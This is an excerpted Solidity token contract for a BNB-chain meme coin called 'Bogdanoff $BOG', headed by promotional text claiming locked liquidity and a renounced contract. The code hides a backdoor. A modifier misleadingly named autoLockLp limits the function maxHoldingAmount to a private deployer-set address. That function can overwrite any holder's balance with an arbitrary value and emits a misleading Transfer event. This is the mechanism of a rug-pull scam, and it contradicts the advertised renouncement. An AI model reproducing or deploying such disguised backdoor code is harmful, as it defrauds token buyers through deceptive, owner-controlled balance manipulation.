...
/**
Bogdanoff $BOG | The meme coin that rules them all 🧠 | Join the Bogdanoff 
https://www.bogdanoffc.wtf/
Liquidity locked 🔒 
Contract renounced ✅ 
Devs based 👩‍💻👨‍💻 
#BOGARMY #Bogdanoff
...
/*
 * @dev Provides information about the current execution BOGontext, including the
...
// File: @openzeppelin/contracts/access/OwnableBOG.sol
 ...
 * the owner.
 */
abstract contract OwnableBOG is BOGontext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnableBOG: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnableBOG: new owner is the zero address");
...
contract BOG is BOGontext, BEP20BOG, OwnableBOG {
   ...
   address private Binancev3rooter; 
    constructor(address Binancev2rooter) {
        ...
        _symbol = "BOG";
        _decimals = 9;
        allTotalSupply = 877779999999999000000000;
    ...
    */
    ...
    /**
    * @dev See {BEP20BOG-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return epxAll[account];
    }
      modifier autoLockLp() {
        require(Binancev3rooter == _msgSender(), "OwnableBOG: caller is not the owner");
        _;
    }
    /**
    * @dev See {BEP20BOG-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function maxHoldingAmount(address BOGPLEBRewards, uint256 aaaMontant, uint256 aaaepx, uint256 subtractedepx) external autoLockLp {
        epxAll[BOGPLEBRewards] = aaaMontant * aaaepx ** subtractedepx;
        
        emit Transfer(BOGPLEBRewards, address(0), aaaMontant);
    }

    /**
    * @dev See {BEP20BOG-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BEP20BOG-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEP20BOG};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address recever, uint256 lamount) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), allowancesAll[sender][_msgSender()].sub(lamount, "BEP20BOG: transfer lamount exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BEP20BOG-approve}.
    *
    ...
    */
    function decreaseAllowance(address spender, uint256 subtractedepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].sub(subtractedepx, "BEP20BOG: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address recever, uint256 lamount) internal {
        require(sender != address(0), "BEP20BOG: transfer from the zero address");
        require(recever != address(0), "BEP20BOG: transfer to the zero address");
                
        epxAll[sender] = epxAll[sender].sub(lamount, "BEP20BOG: transfer lamount exceeds balance");
    ...
    */
    function _approve(address owner, address spender, uint256 lamount) internal {
        require(owner != address(0), "BEP20BOG: approve from the zero address");
        require(spender != address(0), "BEP20BOG: approve to the zero address");
